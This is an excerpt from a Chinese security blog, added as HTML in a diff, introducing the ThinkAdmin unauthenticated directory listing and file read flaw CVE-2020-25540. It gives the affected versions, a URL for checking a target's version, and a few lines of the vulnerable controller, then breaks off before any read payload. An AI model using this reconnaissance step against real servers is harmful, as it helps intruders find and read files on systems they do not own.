+  <time datetime="2022-07-08T06:26:05.222Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkAdmin未授权列目录-任意文件读取-CVE-2020-25540-漏洞"><a href="#ThinkAdmin未授权列目录-任意文件读取-CVE-2020-25540-漏洞" class="headerlink" title="ThinkAdmin未授权列目录/任意文件读取(CVE-2020-25540)漏洞"></a>ThinkAdmin未授权列目录/任意文件读取(CVE-2020-25540)漏洞</h1><h3 id="0X00简介"><a href="#0X00简介" class="headerlink" title="0X00简介"></a>0X00简介</h3><blockquote>
+<p>ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统,ThinkAdmin v6版本存在路径遍历漏洞。攻击者可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件。</p>
+</blockquote>
+<h3 id="0X01影响范围"><a href="#0X01影响范围" class="headerlink" title="0X01影响范围"></a>0X01影响范围</h3><blockquote>
+<p>Thinkadmin ≤ 2020.08.03.01   v5（任意文件读取）   v6（列目录,任意文件读取）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看版本https://ip/admin/login.html?s=admin/api.Update/version</span><br></pre></td></tr></table></figure>
+
+<p>![img](/resource/Untitled/media/640-20201203205524089.png)</p>
+<h3 id="0X02漏洞复现"><a href="#0X02漏洞复现" class="headerlink" title="0X02漏洞复现"></a>0X02漏洞复现</h3><p>在<code>app/admin/controller/api/Update.php</code>中存在3个function，无需登录验证就能使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">namespace</span><br><span class="line">app\admin\controller\api;</span><br><span class="line">use think\admin\Controller;</span><br><span class="line">use think\admin\service\ModuleService;</span><br><span class="line">use think\admin\service\SystemService;</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/ThinkAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2020-25540)%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/ThinkAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96(CVE-2020-25540)%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwsm00isy8v1aetv1e0k" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/33/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="page-number" href="/page/33/">33</a><span class="page-number current">34</span><a class="page-number" href="/page/35/">35</a><a class="page-number" href="/page/36/">36</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/35/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
